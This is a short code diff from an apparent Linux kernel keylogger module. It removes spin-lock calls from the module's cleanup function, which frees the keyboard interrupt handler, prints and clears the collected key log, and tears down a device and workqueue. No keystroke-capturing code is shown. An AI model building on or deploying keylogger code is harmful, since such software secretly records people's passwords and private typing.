@@ -398,7 +398,6 @@ static void		key_log_print_unified(void)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	spin_lock(&slock);
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
@@ -407,7 +406,6 @@ static void		__exit keylogger_clean(void)
 		destroy_workqueue(workqueue);
 	}
 	key_log_clean();
-	spin_unlock(&slock);
 }
 
 static int		__init hello_init(void)
